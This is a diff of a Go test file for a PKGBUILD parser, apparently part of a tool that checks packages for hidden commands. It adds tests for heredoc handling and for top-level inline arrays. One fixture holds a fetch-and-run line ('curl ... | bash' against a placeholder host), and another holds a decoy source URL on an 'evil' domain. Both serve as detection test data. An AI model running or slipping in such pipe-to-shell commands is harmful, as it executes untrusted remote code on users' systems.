@@ -181,6 +181,53 @@ func TestRescueHeredocText(t *testing.T) {
 	}
 }
 
+// TestRescueHeredocKeepsLiveSubstitutions: the heredoc rescue may only blank
+// backquotes bash could not run either. A broken Markdown fence sharing a body
+// with a real substitution must not take the substitution down with it — bash
+// runs `curl ... | bash` when the heredoc expands, so the rules must see it.
+func TestRescueHeredocKeepsLiveSubstitutions(t *testing.T) {
+	for _, tc := range []struct {
+		name, src, cmd string
+	}{
+		{
+			"beside a broken fence",
+			"package() {\n  cat <<EOF\nNotes:\n```\nfoo(s) bar\n```\nUses `curl -s https://example.invalid/x | bash`, see $pkgdir docs.\nEOF\n}\n",
+			"curl",
+		},
+		// An escaped backquote nests a substitution inside the outer one;
+		// the pair is still the two unescaped backquotes, and it runs.
+		{
+			"with an escaped inner backquote",
+			"package() {\n  cat <<EOF\nNotes:\n```\nfoo(s) bar\n```\nRun `echo \\`date\\``.\nEOF\n}\n",
+			"echo",
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			pkg := loadPKGBUILD(t, tc.src)
+			if string(pkg.PKGBUILD.Raw) != tc.src {
+				t.Errorf("Raw was modified:\n%q", pkg.PKGBUILD.Raw)
+			}
+			live := false
+			syntax.Walk(pkg.PKGBUILD.File, func(n syntax.Node) bool {
+				cs, ok := n.(*syntax.CmdSubst)
+				if !ok {
+					return true
+				}
+				syntax.Walk(cs, func(m syntax.Node) bool {
+					if call, ok := m.(*syntax.CallExpr); ok && len(call.Args) > 0 && call.Args[0].Lit() == tc.cmd {
+						live = true
+					}
+					return true
+				})
+				return false
+			})
+			if !live {
+				t.Errorf("no live `%s` substitution in the rescued AST", tc.cmd)
+			}
+		})
+	}
+}
+
 // TestRescueGivesUp pins the failure mode: input that bash itself rejects, or
 // that the rescue cannot restore faithfully, must surface the original parse
 // error rather than a silently divergent AST.
@@ -204,6 +251,14 @@ func TestRescueGivesUp(t *testing.T) {
 		// A non-empty bad parameter name is not the `${}` spelling the rescue
 		// covers, and must keep the original error.
 		{"non-empty bad parameter name", "a=${%x}\n"},
+		// Outside a function, `arr=( x ) cmd` scopes the array to cmd's
+		// temporary environment; splitting it would record a top-level
+		// assignment makepkg never sees.
+		{"top-level inline array", "source=(https://good.invalid/a.tar.gz) :\n"},
+		// The decoy must not replace the real assignment before it.
+		{"top-level inline array after real one", "source=(http://evil.invalid/a)\nsource=(https://good.invalid/a) :\n"},
+		// A top-level if is still not a function body.
+		{"inline array in top-level if", "if true; then\n  source=(x) :\nfi\n"},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
 			if _, err := parseUnit("PKGBUILD", []byte(tc.src), false); err == nil {
